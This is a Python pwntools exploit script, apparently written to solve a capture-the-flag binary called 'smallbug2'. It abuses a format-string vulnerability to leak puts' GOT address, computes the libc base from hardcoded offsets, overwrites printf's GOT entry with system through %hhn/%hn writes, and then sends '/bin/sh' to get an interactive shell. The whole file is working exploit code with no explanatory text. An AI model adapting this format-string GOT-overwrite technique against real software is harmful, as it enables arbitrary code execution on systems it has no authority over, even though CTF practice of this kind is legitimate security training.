from pwn import *

context.log_level = 'debug'

p = process("./smallbug2")

elf = ELF("./smallbug2") 

if __name__=='__main__':

	printf_got = elf.got['printf']
	puts_got = elf.got['puts']
	sys_offset = 0x45390
	puts_offset = 0x6f690
	p.recvuntil("=========================")
#	gdb.attach(p)
	payload = 'a'*0x4+ '%7$s'+ p64(puts_got)
	p.sendline(payload)
	p.recvuntil("aaaa")
	puts_addr = u64(p.recv(6).ljust(8,'\0')) 
	
	libc_base = puts_addr - puts_offset
	print 'libc_base:', hex(libc_base)
	
	sys_addr = libc_base + sys_offset
	

	payload = "%" + str((sys_addr>>16)&0xff) + "c%9$hhn" 
	payload += "%" + str((sys_addr&0xffff)-((sys_addr>>16)&0xff)) + "c%10$hn"

	payload = payload.ljust(24,'a') + p64(printf_got+2) + p64(printf_got)

	p.sendline(payload)
	
	p.sendline("/bin/sh\0")
	
	p.interactive()

	
#	print hex(puts_offset)
#	sys_offset = elf.symbols['system']
#	print hex(sys_offset)

